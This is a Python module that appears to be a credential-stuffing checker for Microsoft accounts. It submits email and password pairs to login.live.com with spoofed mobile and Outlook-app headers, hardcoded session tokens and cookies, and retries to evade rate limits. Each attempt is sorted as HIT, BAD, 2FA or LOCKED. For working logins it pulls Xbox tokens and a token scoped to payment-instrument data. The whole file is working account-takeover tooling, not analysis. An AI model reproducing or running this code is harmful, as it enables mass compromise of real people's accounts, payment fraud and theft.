import re
import uuid
import threading
import urllib.parse
from urllib.parse import quote, unquote
from ..token_extractor import extract_auth_params

_instance = None
_lock = threading.Lock()

_SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

_UA_EDGE = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"
_UA_MOB  = "Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 PKeyAuth/1.0"
_TIMEOUT = 15

_LOGIN_CONFIGS = [
    dict(
        url=(
            "https://login.live.com/ppsecure/post.srf"
            "?username=%7bemail%7d&client_id=0000000048170EF2"
            "&contextid=072929F9A0DD49A4&opid=D34F9880C21AE341"
            "&bk=1765024327&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216&prompt=none"
        ),
        ppft="-Drzud3DzKKJtVD9IfM5xwJywwEjJp5zvvJmrSyu*RKOf!PbgSCQ7ReuKFS*sIpTV5r28epGtqBhqH3JYvND4!onwSWz2JEkvdeewUQC6HmAXRgjYBzSlf0mjEYbx3ULc7oy5fUK3LDSb*CnkAG03FLzwVPmT5WjYu4sE5Wqd93pCx0USJK4jelAWNvsMog0Rmj90tmeCd*1pDYjkINyPEgQSkv6y5GPuX!GmYwKccALUt*!SRaI02p*XUqePtNtJzw$$",
        cookie="MSPRequ=id=N&lt=1765024327&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-90ce4cdb-2718-4d7e-9889-4136cfacc5b2",
    ),
    dict(
        url=(
            "https://login.live.com/ppsecure/post.srf"
            "?username=%7bemail%7d&client_id=0000000048170EF2"
            "&contextid=F3FB0F6AB3D6991E&opid=5F188DEDF4A1266A"
            "&bk=1768757278&uaid=b1d1e6fbf8b24f9b8a73b347b178d580&pid=15216&prompt=none"
        ),
        ppft="-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3HmmMLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpVaBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCucF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$",
        cookie="MSFPC=GUID=cd3df40453784149a05eb0e8d7b0aaf5&HASH=cd3d&LV=202510&V=4; MUID=009CC129162F6E173020D77717446F0A; uaid=b1d1e6fbf8b24f9b8a73b347b178d580; MSPRequ=id=N&lt=1768757278&co=1; MSPOK=$uuid-a26bdf97-2619-4f16-ba61-6b189e1f6e0f",
    ),
    dict(
        url=(
            "https://login.live.com/ppsecure/post.srf"
            "?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en"
        ),
        ppft="-Da1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0U1V2W3X4Y5Z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2A3B4C5D6E7F8G9H0I1J2K3L4M5N6O7P8Q9R0S1T2U3V4W5X6Y7Z8a9b0c1d2e3f4g5h6i7j8k9l0m1n2o3$$",
        cookie="MSFPC=GUID=efghefghefghefghefghefghefghefgh&HASH=efgh&LV=202504&V=4; MUID=98769876987698769876987698769876; MSPOK=$uuid-c632b4d1-5678-4aef-962d-e9a37c2798b5",
    ),
    dict(
        url=(
            "https://login.live.com/ppsecure/post.srf"
            "?nopa=2&client_id=7d5c843b-fe26-45f7-9073-b683b2ac7ec3"
            "&cobrandid=8058f65d-ce06-4c30-9559-473c9275a65d&contextid=F3FB0F6AB3D6991E"
            "&opid=5F188DEDF4A1266A&bk=1768757278&uaid=b1d1e6fbf8b24f9b8a73b347b178d580&pid=15216"
        ),
        ppft="-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3HmmMLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpVaBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCucF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$",
        cookie="MSFPC=GUID=cd3df40453784149a05eb0e8d7b0aaf5&HASH=cd3d&LV=202510&V=4; MUID=009CC129162F6E173020D77717446F0A; uaid=b1d1e6fbf8b24f9b8a73b347b178d580; MSPRequ=id=N&lt=1768757278&co=1; MSPOK=$uuid-a26bdf97-2619-4f16-ba61-6b189e1f6e0f",
    ),
]

_cfg_lock   = threading.Lock()
_cfg_toomany = [0] * len(_LOGIN_CONFIGS)
_cfg_reset_at = [0.0] * len(_LOGIN_CONFIGS)

class NovaLogin:
    pass

def get_novalogin():
    global _instance
    if _instance is None:
        with _lock:
            if _instance is None:
                _instance = NovaLogin()
    return _instance

def _record_toomany(idx):
    import time
    now = time.time()
    with _cfg_lock:
        if now - _cfg_reset_at[idx] > 60:
            _cfg_toomany[idx] = 0
            _cfg_reset_at[idx] = now
        _cfg_toomany[idx] += 1

def _get_fresh_ppft_spykii(email, session):
    for _ in range(2):
        try:
            r = session.get(
                'https://login.live.com/oauth20_authorize.srf',
                params={
                    'client_id': '0000000048170EF2',
                    'redirect_uri': 'https://login.live.com/oauth20_desktop.srf',
                    'response_type': 'token',
                    'scope': 'offline_access openid profile service::outlook.office.com::MBI_SSL',
                    'display': 'touch',
                    'login_hint': email,
                    'msproxy': '1',
                },
                headers={
                    'User-Agent': _UA_MOB,
                    'client-request-id': str(uuid.uuid4()),
                    'Accept': 'text/html,*/*',
                },
                timeout=10,
            )
            text = r.text
            if '"urlPost":"' not in text:
                continue
            url_post = text.split('"urlPost":"')[1].split('",')[0]
            ppft = None
            for start, end in [
                ('name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"'),
                ('name="PPFT" id="i0327" value="', '"'),
                ('"sFT":"', '"'),
            ]:
                if start in text:
                    try:
                        v = text.split(start)[1].split(end)[0]
                        if v and len(v) > 10:
                            ppft = v
                            break
                    except Exception:
                        continue
            if not ppft:
                continue
            ck = r.cookies.get_dict()
            parts = [f'{k}={ck[k]}' for k in ('MSPRequ', 'uaid', 'MSPOK', 'OParams', 'MSFPC', 'MUID') if ck.get(k)]
            if not parts:
                parts.append(f'MSPOK=$uuid-{uuid.uuid4()}')
            return url_post, ppft, '; '.join(parts)
        except Exception:
            continue
    return None

def _get_outlook_tokens(email, session):
    for _ in range(2):
        try:
            headers = {
                "Connection": "keep-alive",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "return-client-request-id": "false",
                "client-request-id": str(uuid.uuid4()),
                "x-ms-sso-ignore-sso": "1",
                "correlation-id": str(uuid.uuid4()),
                "x-client-ver": "1.1.0+9e54a0d1",
                "x-client-os": "28",
                "x-client-sku": "MSAL.xplat.android",
                "x-client-src-sku": "MSAL.xplat.android",
                "X-Requested-With": "com.microsoft.outlooklite",
            }
            params = {
                "client_info": "1", "haschrome": "1", "login_hint": email, "mkt": "en",
                "response_type": "code", "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            }
            url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
            res = session.get(url, headers=headers, timeout=5)
            text = res.text
            if '"urlPost":"' not in text:
                continue
            urlPost = text.split('"urlPost":"')[1].split('",')[0]
            PPFT = None
            for ppft_start, ppft_end in [
                ('name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"'),
                ('name="PPFT" id="i0327" value="', '"'),
                ('"sFT":"', '"'),
            ]:
                if ppft_start in text:
                    try:
                        candidate = text.split(ppft_start)[1].split(ppft_end)[0]
                        if candidate and len(candidate) > 10:
                            PPFT = candidate
                            break
                    except Exception:
                        continue
            if not PPFT:
                continue
            cok = res.cookies.get_dict()
            return urlPost, PPFT, cok.get('MSPRequ', ''), cok.get('uaid', ''), cok.get('MSPOK', ''), cok.get('OParams', '')
        except Exception:
            continue
    return None

def _spykii_attempt(session, email, password, url, ppft, cookie):
    import time
    c429 = 0
    while True:
        try:
            r = session.post(
                url,
                data={
                    'ps': '2', 'psRNGCDefaultType': '1',
                    'psRNGCEntropy': '', 'psRNGCSLK': ppft,
                    'canary': '', 'ctx': '', 'hpgrequestid': '',
                    'PPFT': ppft, 'PPSX': 'Pas', 'NewUser': '1',
                    'FoundMSAs': '', 'fspost': '0', 'i21': '0',
                    'CookieDisclosure': '0', 'IsFidoSupported': '1',
                    'isSignupPost': '0', 'isRecoveryAttemptPost': '0',
                    'i13': '1', 'login': email, 'loginfmt': email,
                    'type': '11', 'LoginOptions': '1', 'lrt': '',
                    'lrtPartition': '', 'hisRegion': '',
                    'hisScaleUnit': '', 'passwd': password,
                },
                headers={
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Cookie': cookie, 'User-Agent': _UA_MOB,
                    'Referer': 'https://login.live.com/',
                    'Origin': 'https://login.live.com',
                    'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate',
                    'Upgrade-Insecure-Requests': '1',
                },
                timeout=12, allow_redirects=False,
            )
        except Exception:
            return 'ERROR'

        code = r.status_code
        if code == 429:
            c429 += 1
            if c429 >= 4:
                return 'ERROR'
            time.sleep(min(3 * c429, 10))
            continue
        if code >= 500:
            return 'ERROR'

        loc = r.headers.get('Location', '')
        if 'access_token=' in loc:
            try:
                tok = urllib.parse.unquote(loc.split('access_token=')[1].split('&')[0])
                if tok and tok != 'None':
                    return session, tok
            except Exception:
                pass
        if 'srf?code=' in loc or 'oauth20_desktop.srf?' in loc:
            return session, None

        try:
            ck = {c.name: c.value for c in session.cookies}
        except Exception:
            ck = {}
        if ck.get('ANON') or ck.get('WLSSC'):
            return session, None

        try:
            body = r.text.lower()
        except Exception:
            body = ''

        bad_patterns = (
            'your account or password is incorrect', 'password is incorrect',
            "that microsoft account doesn't exist", "account doesn't exist",
            'sign in to your microsoft account', 'no account found',
        )
        if any(k in body for k in bad_patterns):
            return 'None'

        toomany_patterns = (
            'you have tried too many times', 'tried too many',
            'too many incorrect password', ',ac:null,',
        )
        if any(k in body for k in toomany_patterns):
            return 'ERROR'

        tfa_patterns = (
            'account.live.com/recover', 'identity/confirm',
            'email/confirm', 'help us protect', 'two-step verification',
            'verify your identity', 'authenticator app',
        )
        if any(k in body for k in tfa_patterns):
            return '2FA'

        if '/cancel?mkt=' in body or '/abuse?mkt=' in body or 'unusual activity' in body:
            return 'LOCKED'

        if 'login.live.com' in str(r.url) and 'oauth20_desktop' not in str(r.url):
            return 'None'

        return session, None

def _ms_login(email, password, session):
    fresh = _get_fresh_ppft_spykii(email, session)
    if fresh:
        url_post, ppft, cookie = fresh
        result = _spykii_attempt(session, email, password, url_post, ppft, cookie)
        if result not in ('None', '2FA', 'ERROR', 'LOCKED') and result is not None:
            return result
        if result in ('None', '2FA', 'LOCKED'):
            return result

    outlook = _get_outlook_tokens(email, session)
    if outlook:
        url_post, ppft, msprequ, uaid, mspok, oparams = outlook
        parts = []
        if msprequ: parts.append(f'MSPRequ={msprequ}')
        if uaid:    parts.append(f'uaid={uaid}')
        if mspok:   parts.append(f'MSPOK={mspok}')
        if oparams: parts.append(f'OParams={oparams}')
        if not parts: parts.append(f'MSPOK=$uuid-{uuid.uuid4()}')
        cookie = '; '.join(parts)
        result = _spykii_attempt(session, email, password, url_post, ppft, cookie)
        if result not in ('None', '2FA', 'ERROR', 'LOCKED') and result is not None:
            return result
        if result in ('None', '2FA', 'LOCKED'):
            return result

    fallback = extract_auth_params(session)
    if fallback and fallback[0]:
        url_post, ppft = fallback
        ck = '; '.join(f'{c.name}={c.value}' for c in session.cookies)
        body = (
            f"ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid="
            f"&PPFT={ppft}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0"
            f"&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0"
            f"&i13=1&login={quote(email)}&loginfmt={quote(email)}&type=11&LoginOptions=1"
            f"&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={quote(password)}"
        )
        try:
            r = session.post(
                url_post, data=body,
                headers={
                    'Host': 'login.live.com', 'Connection': 'keep-alive',
                    'Origin': 'https://login.live.com', 'Referer': _SFTAG_URL,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': _UA_EDGE, 'Accept': 'text/html,*/*',
                    'Cookie': ck,
                },
                timeout=_TIMEOUT, allow_redirects=True,
            )
            status = detect_status(r.text, str(r.url), session.cookies)
            if status == 'HIT':
                return session, None
            if status in ('2FA', 'LOCKED'):
                return status
            if status == 'BAD':
                return 'None'
        except Exception:
            pass

    cfg_order = sorted(range(len(_LOGIN_CONFIGS)), key=lambda i: _cfg_toomany[i])
    for idx in cfg_order:
        cfg = _LOGIN_CONFIGS[idx]
        url = cfg['url'].replace('%7bemail%7d', urllib.parse.quote(email))
        result = _spykii_attempt(session, email, password, url, cfg['ppft'], cfg['cookie'])
        if result == 'None':
            return 'None'
        if result in ('2FA', 'LOCKED'):
            return result
        if result == 'ERROR':
            _record_toomany(idx)
            continue
        if result is not None and result != 'ERROR':
            return result

    return 'ERROR'

def authenticate(email, password, session):
    result = _ms_login(email, password, session)
    if result == 'ERROR':
        return 'ERROR'
    if result == '2FA':
        return '2FA'
    if result == 'LOCKED':
        return 'LOCKED'
    if result == 'None' or result is None:
        return 'BAD'
    if isinstance(result, tuple):
        return 'HIT'
    return 'HIT'

def authenticate_with_token(email, password, session):
    result = _ms_login(email, password, session)
    if result == 'ERROR':
        return 'ERROR', None
    if result == '2FA':
        return '2FA', None
    if result == 'LOCKED':
        return 'LOCKED', None
    if result == 'None' or result is None:
        return 'BAD', None
    if isinstance(result, tuple):
        login_session, access_token = result
        return 'HIT', access_token
    return 'HIT', None

def detect_status(response_text, response_url, cookies):
    txt = response_text
    addr = response_url
    bad_patterns = [
        "Your account or password is incorrect.",
        "That Microsoft account doesn",
        "account doesn't exist",
        "tried to sign in too many times",
        "Sign in to your Microsoft account",
        "no account found",
    ]
    if any(k in txt for k in bad_patterns):
        return 'BAD'
    if ',AC:null,urlFedConvertRename' in txt:
        return 'ERROR'
    tfa_patterns = [
        'account.live.com/recover', 'identity/confirm',
        'Email/Confirm', 'Help us protect',
        'two-step verification', 'verify your identity', 'authenticator app',
    ]
    if any(k in txt + addr for k in tfa_patterns):
        return '2FA'
    if '/cancel?mkt=' in txt + addr or '/Abuse?mkt=' in txt + addr or 'unusual activity' in txt:
        return 'LOCKED'
    cks = {c.name: c.value for c in cookies}
    if 'ANON' in cks or 'WLSSC' in cks or 'oauth20_desktop.srf' in addr or 'access_token' in addr:
        return 'HIT'
    if 'login.live.com' in addr and 'oauth20_desktop' not in addr:
        return 'BAD'
    return 'HIT'

def get_delegate_token(session):
    try:
        r = session.get(
            "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A"
            "&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
            "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
            "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none",
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Referer": "https://account.microsoft.com/",
            },
            timeout=_TIMEOUT, allow_redirects=True,
        )
        m = re.search(r"access_token=([^&]+)", str(r.url))
        if m: return unquote(m.group(1))
        m2 = re.search(r'"access_token"\s*:\s*"([^"]+)"', r.text)
        if m2: return m2.group(1)
    except Exception:
        pass
    return None

def get_rps_token(session):
    try:
        r = session.get(
            "https://login.live.com/oauth20_authorize.srf?client_id=0000000048063CF0"
            "&response_type=token&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&redirect_uri=https://www.xbox.com/en-US/xbox-game-pass",
            headers={
                "User-Agent": _UA_EDGE,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            },
            timeout=_TIMEOUT, allow_redirects=True,
        )
        m = re.search(r"access_token=([^&]+)", str(r.url))
        if m: return unquote(m.group(1))
        m2 = re.search(r'"access_token"\s*:\s*"([^"]+)"', r.text)
        if m2: return m2.group(1)
    except Exception:
        pass
    return None
